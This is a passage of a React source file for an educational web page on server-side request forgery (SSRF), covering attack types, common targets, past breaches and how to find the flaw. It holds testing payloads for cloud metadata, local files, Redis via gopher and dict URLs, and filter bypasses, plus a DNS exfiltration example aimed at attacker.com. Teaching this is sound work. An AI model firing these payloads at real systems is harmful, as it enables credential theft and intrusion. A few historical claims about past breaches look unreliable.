          value={((sectionNavItems.findIndex((s) => s.id === activeSection) + 1) / sectionNavItems.length) * 100}
          sx={{
            height: 4,
            borderRadius: 2,
            bgcolor: alpha(ACCENT_COLOR, 0.1),
            "& .MuiLinearProgress-bar": { bgcolor: ACCENT_COLOR },
          }}
        />
        <Typography variant="caption" sx={{ color: "grey.500", mt: 0.5, display: "block" }}>
          {sectionNavItems.findIndex((s) => s.id === activeSection) + 1} / {sectionNavItems.length} sections
        </Typography>
      </Box>
      <List dense disablePadding>
        {sectionNavItems.map((item) => (
          <ListItem
            key={item.id}
            component="button"
            onClick={() => scrollToSection(item.id)}
            sx={{
              borderRadius: 1,
              mb: 0.5,
              bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.15) : "transparent",
              borderLeft: activeSection === item.id ? `3px solid ${ACCENT_COLOR}` : "3px solid transparent",
              cursor: "pointer",
              border: "none",
              width: "100%",
              textAlign: "left",
              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.08) },
            }}
          >
            <ListItemIcon sx={{ minWidth: 32, color: activeSection === item.id ? ACCENT_COLOR : "grey.500" }}>
              {item.icon}
            </ListItemIcon>
            <ListItemText
              primary={item.label}
              primaryTypographyProps={{
                variant: "body2",
                fontWeight: activeSection === item.id ? 600 : 400,
                color: activeSection === item.id ? "#e0e0e0" : "grey.400",
              }}
            />
          </ListItem>
        ))}
      </List>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="Server-Side Request Forgery (SSRF)" pageContext={pageContext}>
    <Box sx={{ minHeight: "100vh", bgcolor: "#0a0a0f", py: 4 }}>
      <Container maxWidth="xl">
        <Grid container spacing={3}>
          {/* Sidebar Navigation - Desktop */}
          {!isMobile && (
            <Grid item md={2.5} sx={{ display: { xs: "none", md: "block" } }}>
              {sidebarNav}
            </Grid>
          )}

          {/* Main Content */}
          <Grid item xs={12} md={9.5}>
            {/* Header */}
            <Box id="intro" sx={{ mb: 4 }}>
              <Chip
                component={Link}
                to="/learn"
                icon={<ArrowBackIcon />}
                label="Back to Learning Hub"
                clickable
                variant="outlined"
                sx={{ borderRadius: 2, mb: 3 }}
              />
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
                <CloudIcon sx={{ fontSize: 40, color: ACCENT_COLOR }} />
                <Typography
                  variant="h3"
                  sx={{
                    fontWeight: 700,
                    background: `linear-gradient(135deg, ${ACCENT_COLOR} 0%, #06b6d4 100%)`,
                    backgroundClip: "text",
                    WebkitBackgroundClip: "text",
                    color: "transparent",
                  }}
                >
                  Server-Side Request Forgery (SSRF)
                </Typography>
              </Box>
              <Typography variant="h6" sx={{ color: "grey.400", mb: 2 }}>
                Understanding and preventing SSRF vulnerabilities
              </Typography>
              <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                <Chip icon={<CloudIcon />} label="Cloud Metadata" size="small" />
                <Chip icon={<StorageIcon />} label="Internal Services" size="small" />
                <Chip icon={<SecurityIcon />} label="OWASP Top 10" size="small" />
                <Chip icon={<BugReportIcon />} label="Filter Bypass" size="small" />
              </Box>
            </Box>

      {/* Introduction Section */}
      <Paper
        sx={{
          p: 4,
          mb: 4,
          borderRadius: 3,
          background: `linear-gradient(135deg, ${alpha(ACCENT_COLOR, 0.15)} 0%, ${alpha("#06b6d4", 0.1)} 50%, ${alpha(ACCENT_COLOR, 0.05)} 100%)`,
          border: `1px solid ${alpha(ACCENT_COLOR, 0.3)}`,
        }}
      >
        <Typography variant="h5" gutterBottom sx={{ fontWeight: 700, color: "#e0e0e0" }}>
          What is Server-Side Request Forgery?
        </Typography>
        
        <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
          <strong>Server-Side Request Forgery (SSRF)</strong> is a web security vulnerability that allows an attacker 
          to make a server perform requests to unintended locations. Think of it like tricking a librarian into 
          fetching books from a restricted section - you can't go there yourself, but you can convince someone 
          with access to go for you.
        </Typography>

        <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
          <strong>How does it work?</strong> Many web applications fetch data from URLs - for example, a profile 
          picture URL, a webhook endpoint, or a document to convert. If the application doesn't validate these 
          URLs properly, an attacker can provide a URL pointing to internal systems that shouldn't be accessible 
          from the outside.
        </Typography>

        <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
          <strong>Why is it dangerous?</strong> The server making the request typically has access to internal
          networks, cloud metadata services, and other resources that external attackers cannot reach directly.
          SSRF essentially turns a web server into a proxy for attacking internal infrastructure.
        </Typography>

        {/* The Evolution of SSRF */}
        <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#06b6d4", 0.03), borderRadius: 2, border: `1px solid ${alpha("#06b6d4", 0.2)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
            The Evolution of SSRF: From Niche Bug to Critical Threat
          </Typography>
          <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
            SSRF wasn't always considered a critical vulnerability. In the early 2000s, it was seen as a minor security curiosity—an interesting way
            to make servers fetch unexpected content, but not particularly dangerous. The vulnerability landscape changed dramatically with three
            major shifts in technology: the rise of cloud computing, the adoption of microservices architectures, and the proliferation of APIs.
          </Typography>
          <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
            Cloud providers like AWS, Azure, and Google Cloud Platform introduced metadata services accessible at predictable IP addresses
            (169.254.169.254 for most providers). These services were designed to give instances information about themselves—instance IDs, IAM
            roles, temporary credentials, and more. The problem? If an attacker could leverage SSRF to make a cloud instance request its own
            metadata service, they could steal credentials with full permissions to the cloud account. This transformed SSRF from a theoretical
            issue into a critical vulnerability capable of compromising entire infrastructures.
          </Typography>
          <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
            The 2019 Capital One breach exemplified this threat. An attacker exploited an SSRF vulnerability in a web application firewall to
            access AWS metadata credentials, ultimately exfiltrating over 100 million customer records. The breach cost Capital One $80 million
            in fines and settlements, and elevated SSRF to the OWASP Top 10 in 2021. Today, SSRF is one of the most sought-after vulnerabilities
            in bug bounty programs, with payouts regularly exceeding $30,000 for critical findings.
          </Typography>
        </Paper>

        {/* Understanding the Attack Surface */}
        <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
            Understanding the SSRF Attack Surface
          </Typography>
          <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
            The attack surface for SSRF is surprisingly large in modern applications. Any feature that fetches external content is potentially
            vulnerable. This includes obvious candidates like webhook URLs, PDF generators that fetch remote content, image proxies, and URL
            preview features (like the rich link previews you see on social media). But it also includes less obvious attack vectors: XML
            parsers with external entity support, SVG file processors, document converters, feed aggregators, and even some authentication flows
            (OAuth callback URL validation, SAML assertion consumer URLs).
          </Typography>
          <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
            Modern development frameworks and libraries make it trivially easy to fetch URLs—a single line of code in most languages. Python's
            <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px", margin: "0 4px"}}>requests.get(url)</code>,
            Node.js's
            <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px", margin: "0 4px"}}>fetch(url)</code>,
            PHP's
            <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px", margin: "0 4px"}}>file_get_contents()</code>—all
            make the same mistake when given an unvalidated URL parameter. The ease of implementation combined with the lack of security
            awareness means SSRF vulnerabilities are widespread.
          </Typography>
          <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
            The challenge for defenders is that many SSRF-vulnerable features are legitimate business requirements. A SaaS application
            might genuinely need to fetch customer-provided webhooks, or a document service might need to import files from URLs. The
            solution isn't to eliminate these features but to implement them securely—something that requires defense in depth, including
            URL validation, network segmentation, egress filtering, and careful response handling.
          </Typography>
        </Paper>

        <Grid container spacing={2} sx={{ mb: 3 }}>
          {[
            { icon: <StorageIcon />, title: "Access Internal Services", desc: "Reach databases, APIs, and admin panels behind firewalls", color: "#ef4444" },
            { icon: <SecurityIcon />, title: "Steal Cloud Credentials", desc: "Access metadata services like AWS, GCP, Azure", color: "#f59e0b" },
            { icon: <BugReportIcon />, title: "Port Scanning", desc: "Map internal network infrastructure", color: "#22c55e" },
            { icon: <PublicIcon />, title: "Bypass Access Controls", desc: "Access resources restricted by IP allowlists", color: "#06b6d4" },
          ].map((item) => (
            <Grid item xs={12} sm={6} md={3} key={item.title}>
              <Card
                sx={{
                  height: "100%",
                  bgcolor: alpha(item.color, 0.1),
                  border: `1px solid ${alpha(item.color, 0.3)}`,
                  borderRadius: 2,
                }}
              >
                <CardContent>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1, color: item.color }}>
                    {item.icon}
                    <Typography variant="subtitle2" fontWeight="bold" sx={{ color: "#e0e0e0" }}>{item.title}</Typography>
                  </Box>
                  <Typography variant="body2" sx={{ color: "grey.400" }}>{item.desc}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Alert severity="error" sx={{ bgcolor: alpha("#ef4444", 0.1), border: `1px solid ${alpha("#ef4444", 0.3)}` }}>
          <AlertTitle sx={{ color: "#e0e0e0" }}>OWASP Top 10 - A10:2021</AlertTitle>
          <Typography sx={{ color: "grey.300" }}>
            SSRF was added to the OWASP Top 10 in 2021, reflecting its increasing prevalence and impact, 
            especially in cloud environments where metadata services are common attack targets.
          </Typography>
        </Alert>
      </Paper>

      {/* Section: Attack Types */}
      <Box id="attack-types" sx={{ mb: 4, scrollMarginTop: "80px" }}>
        <Paper
          sx={{
            p: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#ef4444", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <BugReportIcon sx={{ color: "#ef4444" }} />
            Types of SSRF Attacks
          </Typography>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
              The Two Flavors of SSRF: Basic vs Blind
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              SSRF vulnerabilities come in two fundamental varieties, each requiring different exploitation techniques. <strong>Basic (Full-Response) SSRF</strong> is
              the easier variant—the attacker can see the full HTTP response from the server-side request, including headers, body content, and error messages.
              This makes exploitation straightforward: point the vulnerable application at an internal service, and the application dutifully returns the response
              to you. This is how the Capital One breach occurred—the attacker could read AWS metadata responses directly through the vulnerable application.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              <strong>Blind SSRF</strong> is significantly harder to detect and exploit but no less dangerous. The application makes the server-side request but
              doesn't return the response to the attacker—you might only see a generic success/failure message or no output at all. This is common in webhook
              implementations where the application validates the URL but doesn't show you what it received. Blind SSRF requires out-of-band (OOB) techniques:
              you must host a server you control and check logs for incoming connections, use DNS exfiltration, or rely on timing attacks. Tools like Burp
              Collaborator and interactsh.com were specifically created to detect blind SSRF by providing callback URLs that log all interactions.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              The severity difference is subtle: while basic SSRF provides immediate feedback making reconnaissance trivial, blind SSRF can still be weaponized
              for devastating attacks. Even without seeing responses, an attacker can use blind SSRF to trigger state changes in internal services (delete
              resources, modify configs), scan internal networks by observing timing differences, or exfiltrate data through DNS queries. The 2019 blind SSRF
              vulnerability in Microsoft Exchange (CVE-2019-0686) allowed attackers to relay NTLM authentication credentials despite never seeing HTTP responses.
            </Typography>
          </Paper>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#06b6d4", 0.03), borderRadius: 2, border: `1px solid ${alpha("#06b6d4", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
              Protocol Smuggling: Beyond HTTP
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              While most developers think of SSRF as an HTTP problem, the vulnerability becomes exponentially more dangerous when the backend library supports
              alternative protocols. Python's <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>urllib</code> supports
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file://</code>,{" "}
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>ftp://</code>, and{" "}
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>gopher://</code> by default. PHP's{" "}
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file_get_contents()</code> and{" "}
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>curl</code> have similar multi-protocol capabilities.
              This transforms a seemingly simple web vulnerability into a file disclosure and network protocol manipulation bug.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              The <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file://</code> protocol allows reading arbitrary
              local files: <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file:///etc/passwd</code> or{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>file:///C:/Windows/win.ini</code>. The{" "}
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>dict://</code> protocol was designed for dictionary
              lookups but can be abused to communicate with Redis, Memcached, and other text-based protocols. Most dangerous is{" "}
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>gopher://</code>—a forgotten protocol from the early
              internet that allows sending arbitrary bytes over TCP. With gopher, an attacker can construct complete HTTP requests, talk to databases, or
              interact with internal APIs using any protocol. A gopher URL can even be used to execute Redis commands, modify Memcached keys, or send SMTP emails.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              The real-world impact is severe. In 2017, security researcher <strong>Orange Tsai</strong> chained SSRF with protocol smuggling to compromise
              GitHub's internal infrastructure by sending gopher URLs that interacted with internal services. The vulnerability earned a $10,000 bounty but
              could have been far more damaging. Protocol smuggling also enables <strong>SSRF-to-XSS</strong> escalation by injecting JavaScript URLs:{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>javascript:alert(document.domain)</code> or{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code>.
            </Typography>
          </Paper>

          <TableContainer component={Paper} sx={{ mb: 3, bgcolor: alpha("#ef4444", 0.05), border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Type</strong></TableCell>
                  <TableCell><strong>Description</strong></TableCell>
                  <TableCell><strong>Example</strong></TableCell>
                  <TableCell><strong>Severity</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {ssrfTypes.map((row) => (
                  <TableRow key={row.type}>
                    <TableCell><Typography fontWeight="bold" color="primary">{row.type}</Typography></TableCell>
                    <TableCell>{row.desc}</TableCell>
                    <TableCell><Typography variant="body2" color="text.secondary">{row.example}</Typography></TableCell>
                    <TableCell>
                      <Chip 
                        label={row.severity} 
                        size="small" 
                        color={row.severity === "Critical" ? "error" : row.severity === "High" ? "warning" : "info"} 
                      />
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Divider sx={{ my: 3 }} />

          <Typography variant="h6" gutterBottom>Common SSRF Targets</Typography>
          <TableContainer component={Paper} sx={{ mb: 3 }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Target</strong></TableCell>
                  <TableCell><strong>Endpoint</strong></TableCell>
                  <TableCell><strong>Protocol</strong></TableCell>
                  <TableCell><strong>Risk</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {commonTargets.map((row) => (
                  <TableRow key={row.target}>
                    <TableCell><Typography fontWeight="bold">{row.target}</Typography></TableCell>
                    <TableCell><code>{row.endpoint}</code></TableCell>
                    <TableCell><Chip label={row.protocol} size="small" variant="outlined" /></TableCell>
                    <TableCell>{row.risk}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Divider sx={{ my: 3 }} />

          <Typography variant="h6" gutterBottom>Real-World SSRF Breaches</Typography>
          <Alert severity="error" sx={{ mb: 2 }}>
            <AlertTitle>Impact of SSRF Vulnerabilities</AlertTitle>
            SSRF has led to some of the most significant data breaches in recent history.
          </Alert>
          <TableContainer component={Paper}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Company</strong></TableCell>
                  <TableCell><strong>Impact</strong></TableCell>
                  <TableCell><strong>Method</strong></TableCell>
                  <TableCell><strong>Bounty/Outcome</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {realWorldBreaches.map((row) => (
                  <TableRow key={row.company}>
                    <TableCell><Typography fontWeight="bold" color="error">{row.company}</Typography></TableCell>
                    <TableCell>{row.impact}</TableCell>
                    <TableCell>{row.method}</TableCell>
                    <TableCell><Chip label={row.bounty} size="small" color="success" variant="outlined" /></TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Accordion sx={{ mt: 3 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Vulnerable Functions by Language</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell><strong>Language</strong></TableCell>
                      <TableCell><strong>Function</strong></TableCell>
                      <TableCell><strong>Library</strong></TableCell>
                      <TableCell><strong>Risk</strong></TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {vulnerableFunctions.map((row, idx) => (
                      <TableRow key={idx}>
                        <TableCell>{row.lang}</TableCell>
                        <TableCell><code>{row.func}</code></TableCell>
                        <TableCell>{row.lib}</TableCell>
                        <TableCell>
                          <Chip label={row.risk} size="small" color={row.risk === "Critical" ? "error" : "warning"} />
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </AccordionDetails>
          </Accordion>
        </Paper>
      </Box>

      {/* Section: Discovery */}
      <Box id="discovery" sx={{ mb: 4, scrollMarginTop: "80px" }}>
        <Paper
          sx={{
            p: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#f59e0b", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <SearchIcon sx={{ color: "#f59e0b" }} />
            Finding SSRF Vulnerabilities
          </Typography>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
              The Art of SSRF Discovery: Think Like a Feature, Not a Bug
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              SSRF is fundamentally different from most web vulnerabilities because it's not usually the result of a coding mistake—it's the result of
              implementing a legitimate feature without considering the security implications. You won't find SSRF by fuzzing for SQL injection or testing
              for XSS. Instead, you need to think about what the application does: <strong>Does it fetch content from URLs? Does it generate previews?
              Does it integrate with external services?</strong> Every feature that makes an outbound request is a potential SSRF vector.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              The most common SSRF vulnerabilities are hiding in plain sight. <strong>Webhook callbacks</strong> are SSRF by design—the application is
              supposed to make requests to user-provided URLs. The question is whether it validates those URLs properly. <strong>URL preview features</strong>
              (like Slack's link unfurling or social media card generation) must fetch URLs to generate previews, making them prime SSRF targets.{" "}
              <strong>PDF generation services</strong> that convert HTML to PDF often allow &lt;img&gt; tags or CSS background images, both of which trigger
              server-side requests. Even seemingly innocuous features like <strong>Gravatar-style avatar loading</strong> can be vulnerable if users can
              specify custom avatar URLs.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              The discovery methodology is straightforward but requires patience: map all application features, identify every parameter that accepts a URL
              or path, and systematically test each one. Don't just look for parameters named "url"—look for "callback", "redirect", "link", "src", "feed",
              "reference", "import", "file", "document", and dozens of other variations. Modern applications often hide SSRF in API integrations: OAuth
              redirect_uri parameters, SAML assertion consumer service URLs, and OpenID Connect callback URLs are all SSRF attack surfaces if improperly validated.
            </Typography>
          </Paper>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
              Out-of-Band Detection: Your Blind SSRF Superpower
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              When you encounter a potential SSRF endpoint but the application doesn't return the response (blind SSRF), you need out-of-band (OOB) detection
              techniques. This means using a server you control to receive callbacks and confirm the vulnerability. The gold standard is <strong>Burp
              Collaborator</strong>, a service that provides unique subdomains and logs all HTTP, DNS, and SMTP interactions. Submit your Burp Collaborator URL
              to the vulnerable parameter, and if the target server makes a request to it, Burp logs the interaction—proving SSRF even when you can't see
              the response directly.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              For bug bounty hunters and researchers without Burp Suite Professional, <strong>interactsh.com</strong> (by ProjectDiscovery) provides an
              open-source alternative with the same capability. You can also roll your own: set up an HTTP server with{" "}
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>python3 -m http.server</code>, expose it with
              ngrok or a VPS, and monitor access logs. The key insight is that even if the vulnerable application doesn't show you the response, the mere
              fact that it made a request to your server proves server-side request forgery occurred.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              OOB detection is also useful for <strong>DNS exfiltration</strong>. Some SSRF filters block HTTP/HTTPS but allow DNS resolution. If you control
              a domain (e.g., attacker.com), you can submit URLs like{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://SECRET-DATA.attacker.com/</code>. Even if
              the HTTP request fails, the target server will perform a DNS lookup for "SECRET-DATA.attacker.com", and you'll see the query in your DNS logs.
              This technique was used in the <strong>2020 SolarWinds breach</strong> to exfiltrate data from compromised networks.
            </Typography>
          </Paper>

          <Alert severity="info" sx={{ mb: 3, bgcolor: alpha("#3b82f6", 0.1), border: `1px solid ${alpha("#3b82f6", 0.3)}` }}>
            <Typography sx={{ color: "grey.300" }}>
              Look for any functionality that fetches external resources: URL imports, webhooks,
              PDF generators, image processors, or API integrations.
            </Typography>
          </Alert>

          <Typography variant="h6" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 2 }}>Common Vulnerable Parameters</Typography>
          <Grid container spacing={1} sx={{ mb: 3 }}>
            {["url", "uri", "path", "dest", "redirect", "link", "src", "source", "file", "document", "page", "callback", "return", "next", "data", "reference", "site", "html", "val", "validate", "domain", "window", "dir", "show", "navigation", "open", "img", "image", "load", "resource", "feed", "host", "port", "to", "out", "view", "content", "target"].map((param) => (
              <Grid item key={param}>
                <Chip label={param} variant="outlined" sx={{ fontFamily: "monospace" }} />
              </Grid>
            ))}
          </Grid>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Vulnerable Functionality Types</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={2}>
                {[
                  { title: "URL Preview/Unfurling", desc: "Slack-style link previews, social media cards", icon: <LinkIcon /> },
                  { title: "Webhooks", desc: "Callback URLs for notifications, payment gateways", icon: <HttpIcon /> },
                  { title: "File Import from URL", desc: "Import documents, images, or data from URLs", icon: <CloudIcon /> },
                  { title: "PDF/Image Generation", desc: "HTML to PDF converters, screenshot services", icon: <LanguageIcon /> },
                  { title: "Proxy/Gateway Services", desc: "URL shorteners, redirectors, API gateways", icon: <PublicIcon /> },
                  { title: "RSS/Feed Readers", desc: "Fetch and parse external RSS/Atom feeds", icon: <DnsIcon /> },
                  { title: "Avatar/Profile Picture", desc: "Gravatar-style URL-based avatars", icon: <StorageIcon /> },
                  { title: "OAuth Callbacks", desc: "Redirect URI parameters in OAuth flows", icon: <SecurityIcon /> },
                ].map((item) => (
                  <Grid item xs={12} sm={6} md={3} key={item.title}>
                    <Card variant="outlined" sx={{ height: "100%" }}>
                      <CardContent>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1, color: "warning.main" }}>
                          {item.icon}
                          <Typography variant="subtitle2" fontWeight="bold">{item.title}</Typography>
                        </Box>
                        <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                      </CardContent>
                    </Card>
                  </Grid>
                ))}
              </Grid>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Detection Techniques</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <List dense>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="Out-of-band (OOB) callbacks" secondary="Use Burp Collaborator, interactsh, or your own server to detect blind SSRF" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="Timing analysis" secondary="Internal hosts often respond faster than external; compare response times" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="Error message differences" secondary="Different errors for reachable vs unreachable hosts reveal internal topology" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="Response size/content analysis" secondary="Internal vs external pages have different sizes and content" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="DNS queries monitoring" secondary="Watch for DNS lookups to your controlled domains" />
                </ListItem>
              </List>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Testing Methodology</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="SSRF Testing Steps">{`# Step 1: Identify URL-accepting parameters
# Look for: url=, path=, src=, dest=, redirect=, uri=, callback=

# Step 2: Test with external callback
url=http://YOUR-COLLABORATOR-URL/test

# Step 3: Test localhost access
url=http://localhost/
url=http://127.0.0.1/
url=http://[::1]/

# Step 4: Test internal network
url=http://192.168.1.1/
url=http://10.0.0.1/
url=http://172.16.0.1/

# Step 5: Test cloud metadata
url=http://169.254.169.254/latest/meta-data/

# Step 6: Test alternative protocols
url=file:///etc/passwd
url=dict://localhost:6379/info
url=gopher://localhost:6379/_INFO

# Step 7: Apply bypass techniques if blocked
url=http://0x7f000001/
url=http://2130706433/
url=http://localhost.nip.io/`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Identifying Blind SSRF</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Alert severity="warning" sx={{ mb: 2 }}>
                Blind SSRF requires out-of-band techniques since you won't see the response directly.
              </Alert>
              <CodeBlock title="Blind SSRF Detection">{`# Using Burp Collaborator
callback_url=http://BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net

# Using interactsh (open source alternative)
url=http://RANDOM.oast.fun

# Using your own server
# 1. Set up a simple HTTP server
python3 -m http.server 8080

# 2. Use ngrok or similar to expose it
ngrok http 8080

# 3. Use the ngrok URL in your tests
url=https://YOUR-NGROK-URL.ngrok.io/ssrf-test

# 4. Monitor server logs for incoming connections`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </Paper>
      </Box>

      {/* Section: Exploitation */}
      <Box id="exploitation" sx={{ mb: 4, scrollMarginTop: "80px" }}>
        <Paper
          sx={{
            p: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#dc2626", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <WarningIcon sx={{ color: "#dc2626" }} />
            SSRF Exploitation
          </Typography>

          <Alert severity="warning" sx={{ mb: 3, bgcolor: alpha("#f59e0b", 0.1), border: `1px solid ${alpha("#f59e0b", 0.3)}` }}>
